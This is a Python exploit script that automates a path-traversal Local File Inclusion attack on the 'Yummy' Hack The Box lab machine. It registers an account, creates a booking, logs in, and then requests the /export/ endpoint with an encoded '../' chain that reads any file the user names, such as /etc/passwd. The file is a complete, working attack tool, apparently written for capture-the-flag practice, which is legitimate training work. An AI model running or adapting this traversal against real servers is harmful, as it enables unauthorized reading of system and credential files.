from datetime import datetime
from urllib.parse import urlencode, quote
import sys
import requests
import argparse
import random
import string


headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}


def parse_arguments():
    """
    Get user flags
    """
    parser = argparse.ArgumentParser(description="Automation for 'Local File Inclusion' in HTB Yummy machine.")
    
    parser.add_argument("-e", "--email", required=True, type=str, help="Email to register for authentication in 'HTB Yummy' webpage.")
    parser.add_argument("-u", "--username", required=True, type=str, help="Username to make the reservation in 'HTB Yummy' page.")
    parser.add_argument("-p", "--password", required=True, type=str, help="Password for authentication in 'HTB Yummy' webpage.")
    parser.add_argument("-f", "--local-file", required=True, type=str, help="File to read through Local File Inclusion vulnerability. Must be an absolute path. Example: /etc/passwd")
    parser.add_argument("--create-account", action="store_true", help="Create an account in 'HTB Yummy' webpage if it has not been already created.")
    
    return parser.parse_args()


def create_account(args: argparse.Namespace)->None:
    """
    Create an account in 'HTB Yummy' webpage (if it has not already been created)
    """
    if not '@' in args.email:
        print("[-] Not a valid email. Try, for example: user@domain.com")
        sys.exit(1)
    register_url = 'http://yummy.htb/register'
    json_data = {"email": args.email, "password": args.password}
    create_account_request = requests.post(url=register_url, headers=headers, json=json_data)
    if 'Invalid' in create_account_request.text:
        print("[-] Username already exists.")
        sys.exit(1)
    print(f"[+] Account created with email {args.email!r} and password {args.password!r}")
    return


def get_encoded_time()->str:
    """
    Get encoded current time in minutes
    """
    current_time = datetime.now().strftime("%H:%M")
    return str(urlencode({"time": current_time}).split('=')[1])


def create_booking(args: argparse.Namespace)->None:
    booking_url = 'http://yummy.htb/book'
    today_date = datetime.today().strftime('%Y-%m-%d')
    length_booking: int = 6
    booking_name: str = f"Booking ID {''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length_booking))}"
    data={'name': args.username,'email': args.email,'phone':'9999999999','date': today_date,'time':get_encoded_time(),'people':'1','message': booking_name}
    request_booking = requests.post(url=booking_url, headers=headers, data=data)
    if request_booking.status_code != 200:
        print(f"[-] Bad status code: {request_booking.status_code!r}")
        sys.exit(1)
    print(f"[+] Booking created as {booking_name!r}") 
    return


def read_file_LFI(args: argparse.Namespace) -> None:
    """
    Execute LFI
    """
    # Get session
    login_url: str = 'http://yummy.htb/login'
    session = requests.Session()
    json_data = {"email": args.email, "password": args.password}
    _ = session.post(url=login_url, headers=headers, json=json_data)
    # Set payloads. Use 'safe' to urlencode '/'
    file_to_read: str = quote('../../../../../../../../../..' + args.local_file, safe='')
    lfi_url: str = 'http://yummy.htb/export/' + file_to_read
    # Get into dashboard
    dashboard_url: str = 'http://yummy.htb/dashboard'
    _ =session.get(url=dashboard_url, headers=headers)
    # Visit reminder page, as shown bu Burp
    reminder_url = 'http://yummy.htb/reminder/21'
    _ = session.get(url=reminder_url, headers=headers, allow_redirects=False)
    # Execute LFI
    print(f"[+] Making http request to {lfi_url!r}")
    lfi_req = session.get(url=lfi_url, headers=headers, allow_redirects=False)
    print(f'[+] Output obtained:\n\n' + lfi_req.text)


def main()->None:
    # Get user arguments
    args: argparse.Namespace = parse_arguments()
    # If a user has not already been created (and if requested), create a user
    if args.create_account:
        create_account(args)
    # Create a random booking
    create_booking(args)
    # Execute LFI
    read_file_LFI(args)


if __name__ == "__main__":
    main()
